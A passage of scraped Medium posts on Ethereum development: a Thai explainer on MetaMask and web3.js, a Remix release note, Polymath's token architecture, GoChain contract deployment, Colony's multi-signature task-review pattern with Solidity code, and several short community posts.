\u0e42\u0e14\u0e22\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e1a\u0e19 Web Browser \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e19\u0e31\u0e49\u0e19 User \u0e21\u0e31\u0e01\u0e08\u0e30\u0e43\u0e0a\u0e49 Metamask \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Chrome Extension \u0e43\u0e19\u0e01\u0e32\u0e23\u0e40\u0e01\u0e47\u0e1a Private Key \u0e41\u0e25\u0e30\u0e17\u0e33\u0e01\u0e32\u0e23\u0e40\u0e0b\u0e47\u0e19\u0e25\u0e32\u0e22\u0e40\u0e0b\u0e47\u0e19\u0e14\u0e34\u0e08\u0e34\u0e15\u0e2d\u0e25\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e44\u0e1b\u0e2b\u0e32 Smart Contract\u0e01\u0e32\u0e23\u0e17\u0e33 Website \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49 User \u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 Metamask \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07 Smart Contract \u0e1a\u0e19 Ethereum \u0e44\u0e14\u0e49\u0e19\u0e31\u0e49\u0e19\u0e08\u0e30\u0e43\u0e0a\u0e49 Javascript Library \u0e0a\u0e37\u0e48\u0e2d web3.js \u0e42\u0e14\u0e22\u0e2b\u0e32\u0e01 User \u0e17\u0e33\u0e01\u0e32\u0e23\u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07 Metamask \u0e44\u0e27\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e1a\u0e19\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e0b\u0e15\u0e4c\u0e17\u0e38\u0e01\u0e40\u0e27\u0e47\u0e1a\u0e44\u0e21\u0e48\u0e27\u0e48\u0e32\u0e08\u0e30\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a Ethereum \u0e2b\u0e23\u0e37\u0e2d\u0e44\u0e21\u0e48\u0e01\u0e47\u0e08\u0e30\u0e16\u0e39\u0e01 Inject \u0e15\u0e31\u0e27 web3.js \u0e44\u0e27\u0e49\u0e42\u0e14\u0e22 Metamask \u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e16\u0e49\u0e32\u0e04\u0e38\u0e13\u0e25\u0e07 Metamask \u0e44\u0e27\u0e49\u0e41\u0e25\u0e49\u0e27 \u0e25\u0e2d\u0e07\u0e04\u0e25\u0e34\u0e01\u0e02\u0e27\u0e32 Inspect \u0e40\u0e27\u0e47\u0e1a\u0e2d\u0e30\u0e44\u0e23\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e41\u0e25\u0e49\u0e27\u0e1e\u0e34\u0e21\u0e1e\u0e4c\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 web3 \u0e01\u0e47\u0e08\u0e30\u0e21\u0e35 return \u0e01\u0e25\u0e31\u0e1a\u0e21\u0e32\u0e40\u0e1e\u0e23\u0e32\u0e30 Metamask \u0e19\u0e31\u0e49\u0e19 Inject Web3 \u0e44\u0e27\u0e49\u0e43\u0e2b\u0e49\u0e17\u0e38\u0e01\u0e40\u0e27\u0e47\u0e1a\u0e17\u0e35\u0e48\u0e40\u0e23\u0e32\u0e40\u0e02\u0e49\u0e32\u0e01\u0e32\u0e23\u0e08\u0e30\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e43\u0e14 \u0e46 \u0e19\u0e31\u0e49\u0e19 User \u0e08\u0e30\u0e15\u0e49\u0e2d\u0e07\u0e17\u0e23\u0e32\u0e1a ABI \u0e2b\u0e23\u0e37\u0e2d Application Binary Interface \u0e02\u0e2d\u0e07 Smart Contract \u0e19\u0e31\u0e49\u0e19 \u0e46 \u0e42\u0e14\u0e22\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32 Smart Contract \u0e08\u0e30\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a ABI \u0e08\u0e32\u0e01\u0e01\u0e32\u0e23 Compile \u0e41\u0e25\u0e49\u0e27\u0e19\u0e33\u0e44\u0e1b\u0e41\u0e08\u0e01\u0e08\u0e48\u0e32\u0e22\u0e43\u0e2b\u0e49 User \u0e42\u0e14\u0e22 User \u0e08\u0e30\u0e40\u0e2d\u0e32 ABI \u0e44\u0e1b\u0e43\u0e0a\u0e49\u0e01\u0e31\u0e1a MyEtherWallet \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e2b\u0e32 Smart Contract \u0e01\u0e47\u0e44\u0e14\u0e49 \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e39\u0e2b\u0e19\u0e49\u0e32\u0e15\u0e32\u0e02\u0e2d\u0e07 ABI \u0e44\u0e14\u0e49\u0e43\u0e19\u0e42\u0e04\u0e49\u0e14\u0e14\u0e49\u0e32\u0e19\u0e25\u0e48\u0e32\u0e07[ {  \"constant\": true,  \"inputs\": [],  \"name\": \"sayHello\",  \"outputs\": [   {    \"name\": \"\",    \"type\": \"string\"   }  ],  \"payable\": false,  \"stateMutability\": \"pure\",  \"type\": \"function\" }]\u0e41\u0e15\u0e48\u0e43\u0e19\u0e17\u0e32\u0e07\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e08\u0e23\u0e34\u0e07 Website \u0e2b\u0e23\u0e37\u0e2d Client \u0e02\u0e2d\u0e07\u0e1c\u0e39\u0e49\u0e1e\u0e31\u0e12\u0e19\u0e32\u0e08\u0e30\u0e40\u0e01\u0e47\u0e1a ABI \u0e44\u0e27\u0e49\u0e17\u0e35\u0e48 Website \u0e41\u0e25\u0e30\u0e1c\u0e39\u0e01 web3.js \u0e43\u0e2b\u0e49 User \u0e2d\u0e22\u0e39\u0e48\u0e41\u0e25\u0e49\u0e27\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e07\u0e48\u0e32\u0e22\u0e15\u0e48\u0e2d\u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01 Metamask \u0e19\u0e31\u0e49\u0e19\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e40\u0e01\u0e47\u0e1a Private Key \u0e41\u0e17\u0e19 User \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e01\u0e34\u0e14 Use Case \u0e43\u0e2b\u0e21\u0e48 \u0e46 \u0e17\u0e35\u0e48\u0e19\u0e48\u0e32\u0e2a\u0e19\u0e43\u0e08\u0e02\u0e36\u0e49\u0e19 \u0e40\u0e0a\u0e48\u0e19 \u0e01\u0e32\u0e23 Login With Metamask \u0e42\u0e14\u0e22 User \u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e23\u0e2d\u0e01\u0e23\u0e2b\u0e31\u0e2a\u0e1c\u0e48\u0e32\u0e19\u0e41\u0e25\u0e30 Username \u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e43\u0e19 Website \u0e40\u0e25\u0e22\u0e41\u0e15\u0e48 User \u0e01\u0e47\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e23\u0e2d\u0e01 Password \u0e40\u0e1e\u0e37\u0e48\u0e2d Unlock Wallet \u0e01\u0e48\u0e2d\u0e19\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e17\u0e35\u0e48 Metamask \u0e2d\u0e22\u0e39\u0e48\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e04\u0e27\u0e32\u0e21\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22 \u0e41\u0e15\u0e48\u0e19\u0e31\u0e48\u0e19\u0e2b\u0e21\u0e32\u0e22\u0e04\u0e27\u0e32\u0e21\u0e27\u0e48\u0e32 Password \u0e19\u0e31\u0e49\u0e19\u0e16\u0e39\u0e01\u0e19\u0e33\u0e44\u0e1b\u0e16\u0e2d\u0e14\u0e23\u0e2b\u0e31\u0e2a\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e19\u0e33 Private Key \u0e2d\u0e2d\u0e01\u0e21\u0e32\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 \u0e15\u0e31\u0e27 Password \u0e44\u0e21\u0e48\u0e44\u0e14\u0e49\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a Website \u0e41\u0e15\u0e48\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e43\u0e14", "responses": ""}, {"title": "Remix IDE 0.6.3\u00a0Release", "author_name": "Nina Breznik", "link": "https://medium.com/remix-ide/remix-new-release-dcd5673e6777?source=search_post", "post_date": "May 14, 2018", "readtime": "3 min read", "upvotes": "72", "content": "Remix IDE 0.6.3\u00a0ReleaseNina BreznikBlockedUnblockFollowFollowingMay 14, 2018On May 8th 2018 we released a new version of Remix-IDE. What has changed in this release?", "responses": "3"}, {"title": "Exploring the Polymath Core Architecture", "author_name": "Pablo Ruiz", "link": "https://blog.polymath.network/exploring-the-polymath-core-architecture-15c7b658bd5b?source=search_post", "post_date": "Apr 19, 2018", "readtime": "7 min read", "upvotes": "379", "content": "Exploring the Polymath Core ArchitecturePablo RuizBlockedUnblockFollowFollowingApr 19, 2018With the release of Polymath Core \u201cToro\u201d, we re-engineered Polymath\u2019s complete smart contract suite to make it easier to issue regulatory-compliant Securities Tokens on the Ethereum blockchain.In last week\u2019s article we went over the ST-20 interface and briefly touched on the new architecture of the Polymath Core contracts. In this article we are going to learn what the Polymath Core ecosystem looks like and how we approached smart contract modularity to make Security Tokens easy to deploy as well as upgrade.The Polymath Network ArchitectureBefore we get started, let\u2019s quickly do a recap of the ST-20 interface. The ST-20 token is an ERC-20 compliant token that adds one fundamental method, verifyTransfer which must be implemented on the transfer and transferFrom methods to determine if a transaction should be allowed or not.Our own implementation of this interface is called SecurityToken, which follows a modular approach. The SecurityToken contract gets a series of modules attached to it by default in order to define its behavior. Issuers may attach their own\u200a\u2014\u200aor other\u2019s\u2014 creations to comply with their business requirements.Before we go into details with regard to how modules work, let\u2019s explore what the complete Polymath landscape looks like:The Polymath RegistriesThe Polymath Network is comprised of several interconnecting pieces that make it easy for us to \u201cupgrade\u201d the Security Token contract and add incremental features as the platform evolves. With Polymath, Security Tokens and their available modules are managed by a set of registries:Ticker Registry: One design decision we made early on was giving issuers the ability to reserve token symbols. On the Polymath platform, token symbols are unique; no two securities tokens may have the same symbol. Tokens are, of course, still uniquely identifiable by their contract address on the Ethereum network, but they can also be identified by their token symbol. There are obvious upsides and downsides to this approach. On one hand, this prevents malicious actors from deploying tokens with the same token symbol as popular companies, expecting to scam inadvertent users. On the other hand, symbol \u201csquatting\u201d could be a problem as the platform gains widespread adoption and people want to secure token symbols for themselves.\u00a0In any case, the Ticker Registry serves the purpose of managing token symbol \u201creservations\u201d and only allowing tokens with unique tickers to be created.Security Token Registry: The Security Token Registry keeps a record of all tokens issued on the Polymath platform and manages what version of the SecurityToken will be used by the issuance platform. The Security Token Registry uses a token proxy mechanism that allows us to upgrade the Security Token and have the Registry deploy these new token versions as we release them. Notice that existing ST-20 tokens will not be upgraded when there\u2019s a protocol upgrade, but rather, they are self-contained and unaffected by any changes made to the platform as a whole.Module Registry: The Module Registry is one of the most interesting aspects of the Polymath platform and it is what gives the platform its flexibility. As mentioned before, the SecurityToken smart contract is a base implementation of the ST-20 interface which allows for these so-called modules to be attached to it. The Module Registry acts as a repository of \u201cblueprints\u201d for these user-submitted modules that can be mixed-and-matched to specific tokens.\u00a0At Polymath, we have developed a few modules that grant Security Token contracts with base functionality, and we expect and encourage the developer community to submit their own creations.Exploring SecurityToken\u2019s ModularityThe SecurityToken smart contract has been designed to support a wide range of modules with different functionalities. These modules work like add-ons to the token which can be added, upgraded or removed depending on the needs of the issuer. Modules are grouped into categories, and depending on the category, multiple modules may be present that could be replaceable or non-replaceable. For our Toro release, we have made the following module types available: Transfer modules, Permission modules, and Security Token Offering (STO) modules.Transfer Modules: Transfer Modules control the logic behind transfer restrictions. Once the initial offering has been launched, the Transfer modules are in charge of controlling who can and cannot buy or sell tokens according to their own internal logic. With Toro, we have released 2 Transfer modules:General Transfer Manager Module: This is a general-approach whitelist-based Transfer module. This module holds a list of verified investors and their sale/purchase restrictions. When a transfer is attempted, this module will check if the addresses are present on the whitelist and it will allow or disallow the transaction.Exchange Transfer Manager Module: This module has been created specifically for dealing with centralized exchanges. By using this module, the issuer may grant a particular exchange with permissions to add their own KYC verified users to a separate whitelist. An in-depth explanation of how these transfer managers work is outside the scope of this article.Permission Modules: Permission modules give the issuer the ability to grant other accounts permissions to certain operations within their issuance process. For example, by using the default Permission Manager module, the issuer might give a person they trust the ability to manage their whitelisting process; or they might use it to give an external smart contracts developer the ability to set up their STO contract.Security Token Offering Module: These modules control the logic behind the token\u2019s initial issuance/sale. A Security Token may assign one, and only one, STO during its life-cycle and this module, once attached and configured, may not be replaced. We\u2019ll go over how the STOs work in a future article, but for now, it\u2019s important to know that these modules are the equivalent to the ICO\u2019s Crowdsale contracts. They control the logic under which tokens are distributed/sold and there are infinitely many ways they can go about this. For the Toro release, we included a Capped STO which allows the issuer to sell their tokens under the following logic:Raise in POLY or ETH: The Capped STO allows the issuer to select if they want to do the raise completely in POLY or completely in ETH.Start and End dates: The capped offering has a start date and an end date. Tokens may only be acquired during that period.Hard cap: There\u2019s a maximum amount of tokens that can be sold during the offering. No more contributions may be received if all tokens have been sold. Tokens are only minted after each purchase, so if the cap is not reached, the remaining unsold tokens will simply not be created.Exchange Rate: The exchange rate between ETH/POLY and the token being sold can be set before the offering starts and determines how many of the tokens can be purchased with 1 ETH/POLY.So, How Do All These Pieces Fit Together?", "responses": "3"}, {"title": "How to Deploy a Smart Contract in 5\u00a0Minutes", "author_name": "Travis Reeder", "link": "https://medium.com/gochain/how-to-deploy-a-smart-contract-in-5-minutes-bed2443be23c?source=search_post", "post_date": "Aug 16, 2018", "readtime": "2 min read", "upvotes": "739", "content": "How to Deploy a Smart Contract in 5\u00a0MinutesTravis ReederBlockedUnblockFollowFollowingAug 16, 2018UPDATE FEB 7, 2019: Want to do it in 3 minutes? Check out the new web3 tool that makes all of this WAY easier: https://github.com/gochain-io/web3Creating and deploying Ethereum based smart contracts has never been a simple task. Typically requiring you to use some complicated framework, run a local node and/or develop in a barely usable online editor. Today I\u2019ll show how easy it is to deploy a contract to GoChain.PrerequisitesYou will need a few things before we get started:Install Visual Studio Code (you should already be using this if you\u2019re a developer anyways)Install the VS Code Solidity extensionGet some GO\u200a\u2014\u200aAsk for some free testnet GO in our Testnet Telegram or buy some on KuCoin to deploy to mainnetCompile your\u00a0ContractLet\u2019s take the simple token code from the Ethereum website, it looks like this:Copy that code and paste it into a new file called mytoken.sol in VS CodePress F5 to compileThis will create a few files in a bin/ directory, open MyToken.bin\u00a0. This contains your contract bytecode, which you\u2019ll use below.Now you have the bytecode for your contract, let\u2019s deploy it!Deploy your\u00a0ContractThis is really easy using the GoChain Wallet:Go to https://wallet.gochain.io/In the top right, choose TestNetClick Open WalletPaste your private key for your testnet wallet that has the GO you got from our TelegramClick Deploy ContractCopy the contents of MyToken.bin into the Bytecode fieldClick Send!After a few seconds your contract will be deployed and you\u2019ll get a contract address, copy the address and save it somewhere. That address is what people will use to interact with your contract.Next StepsAfter you\u2019ve deployed your contract, you\u2019ll want to use it. There are many ways people can interact with your contracts, whether it\u2019s sending GO directly to it, using the GoChain Wallet, using MyEtherWallet, or using a DApp that uses it. We won\u2019t go into that in this post as we could write several other posts on that part and it depends on what your contract does.We know it can be intimidating to know where to start when you first get into developing smart contracts, I hope this post helps you see how easy it can be.More documentation at: https://github.com/gochain-io/docs", "responses": ""}, {"title": "Parameterized Transaction Reviews", "author_name": "Elena Dimitrova", "link": "https://medium.com/colony/parameterized-transaction-reviews-11f0cdc40479?source=search_post", "post_date": "Sep 20, 2018", "readtime": "7 min read", "upvotes": "582", "content": "Parameterized Transaction ReviewsFor when a multi-sig is just not granular enough for your transaction review\u00a0needsElena DimitrovaBlockedUnblockFollowFollowingSep 20, 2018It\u2019s like that game \u201cOperation\u201d, but for bytecode!Multi-signature transactions are one of the most useful patterns for smart contracts and the dApps that utilize them. But in the \u2018vanilla\u2019 implementation of multi-signature design, transaction reviewers (owners), are assigned contract-wide and review all transactions. Colony\u2019s requirements for multi-sig transactions are more complex than this provides. We have multiple user roles within a Colony, and depending on context, which signatures are required for various operations may differ.For example, one of the base building blocks in Colony is the Task. A task is a small unit of work to be done for an organization, and it has three distinct roles defined to coordinate that work: a manager, an evaluator and a worker.There are many tasks within each colony and each can have a different set of users assigned to these three roles for each task. We want the flexibility to have any combination of two of the three task roles to be configurable as reviewers on a particular task change type as shown in the example set of four Taskchange functions below.+------------------------+-----------------+-----------------+|      Function          | Reviewer Role 1 | Reviewer Role 2 |+------------------------+-----------------+-----------------+| setTaskBrief           | manager         | worker          || setTaskDueDate         | manager         | worker          || setTaskEvaluatorPayout | manager         | evaluator       || setTaskWorkerPayout    | manager         | worker          |+------------------------+-----------------+-----------------+If a task manager decides to change some of its properties, such as to change the work brief (specification) hash, this change should also be reviewed by the worker, who will have to adjust to the new terms in order to claim a payout and reputation gain. In another case, if a manager wants to change the evaluator\u2019s payout, the change should be approved by the evaluator rather than the worker.Additionally we don\u2019t want to have each role sign and submit a transaction to the blockchain individually\u200a\u2014\u200athis will cost too much gas to be manageable in the long term. The change should instead be agreed upon in advance, and then committed to the blockchain only once with the required signatures.To achieve all this, we created the parameterized transaction review design pattern, and implemented it within Colony tasks.Our implementation builds upon the ideas insimple-multisigdesign by Christian Lundkvist, where transaction data is submitted and only executed once (on chain) after all required signatures are received (off chain).Let\u2019s get into the details of how this all works!Constructing the task change transaction dataWe\u2019ll refer to a simplified version of the Colony Task data structure and a set of update functions to demonstrate the design.struct Task {    bytes32 specificationHash;    uint256 dueDate;    // Role Ids mapping to user addresses, using role Ids:    // 0 - task manager, 1 - task evaluator, 2 - task worker    mapping (uint8 => address) roles;    // Maps task role ids (0,1,2) to payment amount    mapping (uint8 => uint256) payouts;}  mapping (uint256 => Task) tasks;uint256 taskCount;uint8 constant MANAGER = 0;uint8 constant EVALUATOR = 1;uint8 constant WORKER = 2;function setTaskBrief(uint256 _id, bytes32 _specificationHash) public {    tasks[_id].specificationHash = _specificationHash;}  function setTaskDueDate(uint256 _id, uint256 _dueDate) public {    tasks[_id].dueDate = _dueDate;}  function setTaskEvaluatorPayout(uint256 _id, uint256 _amount) public {    tasks[_id].payouts[EVALUATOR] = _amount;}  function setTaskWorkerPayout(uint256 _id, uint256 _amount) public {    tasks[_id].payouts[WORKER] = _amount;}The four functions above have to check two different pairs of signatures as specified in requirements table above.Additionally, there are many tasks within a colony, and each task will have its own set of users assigned to roles\u200a\u2014\u200aso the required signatures should be dynamically retrieved from the task being updated.As I mentioned, gas is expensive. We don\u2019t want users to be constantly sending transactions to the blockchain if they don\u2019t have to. So in this case, the manager creates a transaction locally for the operation that needs to be performed:setTaskBrief(1, \"0x017dfd85d4f6cb4dcd715a88101f7b1f06cd1e009b2327a0809d01eb9c91f232\")which is composed into the following transaction data bytes:0xda4db2490000000000000000000000000000000000000000000000000000000000000001017dfd85d4f6cb4dcd715a88101f7b1f06cd1e009b2327a0809d01eb9c91f232This raw byte data is then signed as a message with the Manager\u2019s key, and through the magic of colonyJS, the signed message can be sent as a JSON object to the Worker, off-chain. The worker may inspect the transaction if necessary to make sure that the raw byte data corresponds to the agreed upon change, and then add their signature to the transaction.When both signatures have been collected, the transaction can be submitted to the blockchain, with all parameters passed as arguments to the executeTaskChange function:function executeTaskChange(uint8[] _sigV,bytes32[] _sigR,bytes32[] _sigS, uint8[] _mode,uint256 _value,bytes _data) public stoppable{   // The full function appears later in this post.}Deconstructing the transactionAs the task change is submitted to the blockchain, the executeTaskChange function then needs a way to pull out the byte data that corresponds to which task is being changed, what the change is, and check it against which signatures are authorized to approve the change.Our solution pulls the relevant information straight from the embedded byte data, using Solidity assembly mload function to read values from EVM memory which is where the input _data parameter is held. On-chain, the deconstructCall method gets the task Id and the signature of the task change function.function deconstructCall(bytes _data) internal pure returns (bytes4 sig, uint256 taskId) {    assembly {      sig := mload(add(_data, 0x20))      taskId := mload(add(_data, 0x24))    }  }Let\u2019s break all that down a bit more!deconstructCall operates on the raw transaction _data bytes. Recall that the manager wants to setTaskBrief on task id 1 with a new work specification. This translates to the following raw transaction:0xda4db2490000000000000000000000000000000000000000000000000000000000000001017dfd85d4f6cb4dcd715a88101f7b1f06cd1e009b2327a0809d01eb9c91f232Using remix, we can inspect the result in EVM memory:0x90: 000000000000000000000000000000440xa0: da4db2490000000000000000000000000xb0: 000000000000000000000000000000000xc0: 00000001017dfd85d4f6cb4dcd715a880xd0: 101f7b1f06cd1e009b2327a0809d01eb0xe0: 9c91f232The transaction data is a dynamic bytes type in Solidity, which is packed tightly in calldata. The first slot (in example above, slot 0x90) represents its length (0x44, or 68 in decimal notation). These 68 bytes comprise 4 bytes for the function signature, 32 bytes for the first function parameter (uint256 taskID), and 32 bytes for the second function parameter (bytes32 specificationHash).So we must add 0x20 (or 32 bytes) to find the start of the actual transaction data value, skipping over the length. The first 4 bytes there hold the function signature we want to call on the task:sig\u00a0:= mload(add(_data, 0x20)) returns da4db249.The taskID is analogous, but it will be located another 32 bytes later in the next memory slot, so we add 0x24:taskId\u00a0:= mload(add(_data, 0x24)) returns the taskID.(Note that here we rely on the taskId to be the first parameter of the function call for updating a task.)Setting the permissionsThe last piece of the puzzle is to get the transaction to go through if and only if the signatures of the correct people are present, and to revert in all other cases.For specifying the reviewer rules we map function signatures to 2 reviewer roles array, e.g. setTaskBrief => [0,2]For simplicity and security we initialize the task update function reviewers in the constructor:// Mapping function signature to 2 task role reviewersmapping (bytes4 => uint8[2]) public reviewers;  constructor() {        setFunctionReviewers(bytes4(keccak256(\"setTaskBrief(uint256,bytes32)\")), MANAGER, WORKER);    setFunctionReviewers(bytes4(keccak256(\"setTaskDueDate(uint256,uint256)\")), MANAGER, WORKER);setFunctionReviewers(bytes4(keccak256(\"setTaskEvaluatorPayout(uint256,uint256)\")), MANAGER, EVALUATOR);        setFunctionReviewers(bytes4(keccak256(\"setTaskWorkerPayout(uint256,uint256)\")), MANAGER, WORKER);}  function setFunctionReviewers(bytes4 _sig, uint8 _firstReviewer, uint8 _secondReviewer)private{  uint8[2] memory _reviewers = [_firstReviewer, _secondReviewer];  reviewers[_sig] = _reviewers;}Putting it together to execute a signed and reviewed task\u00a0updateWe reroute the public task update functions to be called only internally and expose a single public executeTaskChange function to call them instead, which checks that the the required signatures match those defined in the reviewer rules before executing the change function call.modifier self() {  require(address(this) == msg.sender);  _;}function executeTaskChange(uint8[] _sigV, bytes32[] _sigR, bytes32[] _sigS, uint256 _value, bytes _data)public {  require(_sigR.length == 2);  bytes4 sig;  uint256 taskId;  (sig, taskId) = deconstructCall(_data);bytes32 msgHash = keccak256(abi.encodePacked(address(this),      address(this), _value, _data, taskChangeNonces[taskId]));address[] memory reviewerAddresses = new address[](2);  for (uint i = 0; i < 2; i++)   {     bytes32 txHash;     txHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", msgHash));     reviewerAddresses[i] = ecrecover(txHash, _sigV[i], _sigR[i], _sigS[i]);   }       require(reviewerAddresses[0] != reviewerAddresses[1]);       require(      reviewerAddresses[0] == tasks[taskId].roles[reviewers[sig][0]]      ||      reviewerAddresses[0] == tasks[taskId].roles[reviewers[sig][1]]    );     require(      reviewerAddresses[1] == tasks[taskId].roles[reviewers[sig][0]]          ||      reviewerAddresses[1] == tasks[taskId].roles[reviewers[sig][1]]    );taskChangeNonces[taskId] += 1;   require(executeCall(address(this), _value, _data));}  function executeCall(address to, uint256 value, bytes data)   internal returns (bool success) {   assembly {     success := call(gas, to, value, add(data, 0x20), mload(data), 0, 0)    } }ConclusionThe parameterized transaction review design pattern outlined here provides a viable alternative inspired by the simple multi-sig and taken to a lower level to allow reviewers to be dynamically chosen for a given data type, based on which contract function is called and which item is being modified.For use within a Colony task, three roles are all we need for each of the Manager, Evaluator, and Worker\u200a\u2014\u200abut in principle this pattern could be applied to any number of roles and function parameters within a single contract.All this was done in the interest of efficiency and flexibility: We are able to have both a single on-chain transaction and a fine-grained set of parameters for multi-signature operations, without wasting time or (gas) money.If you\u2019re interested in this kind of technical discussion and want to know more about parameterized transaction reviews, please reach out with your questions on Gitter, or post a question in our forums at build.colony.io\u200a\u2014\u200aand if you\u2019d like to, contribute to the colonyNetwork.", "responses": ""}, {"title": "The Buidling\u00a0Blocks", "author_name": "Richard Burton", "link": "https://medium.com/balance-io/the-buidling-blocks-5770c698007f?source=search_post", "post_date": "Mar 13, 2018", "readtime": "2 min read", "upvotes": "360", "content": "The Buidling\u00a0BlocksThoughts on\u00a0EthCCRichard BurtonBlockedUnblockFollowFollowingMar 13, 2018Last week I attended the Ethereum Community Conference in Paris. Since then, I have been processing all of the technical presentations, in-depth discussions, late-night debates, and new projects I came across at this incredible event. After some time, my thoughts have started to orbit around a central theme: the buidling blocks for third web are here.EthCC was held at the Conservatoire National des Arts et M\u00e9tiers,\u00a0ParisI grew up building things on the web we have today. I would write code on my computer and push it to a server that a company controlled. When I stopped paying them, my website would stop working. My customers\u2019 data would be stored on a database that I managed. Everyone had a username and password to log in. This was the way to make things on the web. I was using the tools that were available. It is really tricky to shake off that mental model and think about the web we will have tomorrow. Too often, I find myself wanting to build products with the tools I am used to. Instead, I need to force myself to think about what is going to be possible with this new development stack.Whenever I worry about how slow Ethereum is, I need to dive into Tendermint Consensus, Parity\u2019s Bridges, Counterfactual\u2019s state channels, Plasma Cash, Casper\u2019s shards & Keep\u2019s off-chain computation.Whenever I am too scared to write Solidity, I should check out Truffle\u2019s new debugger, Zeppelin\u2019s work on contract upgrades, Axoni\u2019s work on formal verification for contracts.Whenever I think about storing data on a server, I should try push encrypted files to the networks from Storj, Sia, IPFS & NuCypher.Whenever I think about using a centralised exchange, I should try out AirSwap\u2019s peer-to-peer network, Gnosis\u2019 Dutch Auction and Cosmos peg zones.Whenever I think about building a company, I should experiment with Aragon\u2019s point-and-click DAO-creator and Colony\u2019s work management tools.I stumbled into the Ethereum project in 2015 and helped out with a few interface design concepts before the sale. Despite this early exposure, I still struggle to think about a world where the promises of Web 3 actually come true. The Ethereum Community Conference was a welcome reminder that the buidling blocks are here. Now it is time to #BUIDL.", "responses": ""}, {"title": "CryptoZombies Lesson 2 Released! Coding Your Own Game on\u00a0Ethereum", "author_name": "Matthew Campbell", "link": "https://medium.com/loom-network/cryptozombies-lesson-2-released-coding-your-own-game-on-ethereum-e23c08c54e39?source=search_post", "post_date": "Dec 22, 2017", "readtime": "2 min read", "upvotes": "289", "content": "CryptoZombies Lesson 2 Released! Coding Your Own Game on\u00a0EthereumMatthew CampbellBlockedUnblockFollowFollowingDec 22, 2017Last week we launched Cryptozombies: Interactive Code School for Building Games on Ethereum, and had over 20,000 users try it out in the first week!For those who have been waiting, we\u2019ve finally released lesson 2.Lesson 2 will teach you how to multiply your zombie army by feeding on other lifeforms:And what type of lifeforms do CryptoZombies love to feed on, you ask?Well you\u2019ll have to complete Lesson 2 to find out!But here\u2019s a hint: We\u2019re going to learn how to interact with other smart contracts on the Ethereum blockchain.You may have heard of the contract we\u2019re talking about \ud83d\ude09Anyway, in this Lesson we cover some more advanced Solidity concepts, so it\u2019s highly recommended that you complete Lesson 1 before starting.Check it out: https://cryptozombies.io/and let us know what you think! We always appreciate your feedback.", "responses": ""}, {"title": "Hey Baby, I Think I Wanna Marry You (On the Blockchain) \ud83d\udc92", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/hey-baby-i-think-i-wanna-marry-you-on-the-blockchain-3227ba3bdfe?source=search_post", "post_date": "Nov 8, 2017", "readtime": "6 min read", "upvotes": "90", "content": "Photo by One Wedding on\u00a0UnsplashHey Baby, I Think I Wanna Marry You (On the Blockchain) \ud83d\udc92Pablo RuizBlockedUnblockFollowFollowingNov 8, 2017The concept of matrimony has existed for tens of thousands of years, but only a few hundred years ago they started involving actual contracts or even a ceremony. As a matter of fact, even though the Bible features lots of married people, there are no descriptions of ceremonies\u00a0According to this article:The only \u201cceremony\u201d I can find in the Bible is Tobit 7:12\u201314 in which a father places the hand of his daughter in the hand of the husband, and then writes a contract.[\u2026]\u00a0No vows, no priest, no ritual, no prayer, no pronouncement, no license, no registration.Of course, this has changed in the past hundreds of years. Today, for a marriage to be considered legal it has to be recognized by the State. Each culture, religion, country and state also have their own rules to determine what constitutes a valid marriage. Fro example there are some places where same-sex marriages are permitted and others places where they are not, child marriages and cousin marriages are permitted in some countries or cultures, some countries allow for men to marry more than one woman, etc, etc.How the ceremonies are performed also vary from place to place. For example, some states and countries require the presence of witnesses during the ceremony. According to what I could find around online, they were mostly required to ensure that neither spouse has been forced into the wedding. Today, they are chosen for being close friends or relatives whom the couple wants to share that special moment with.Getting Married on the BlockchainIn this article, I intend to approach how a marriage contract could look 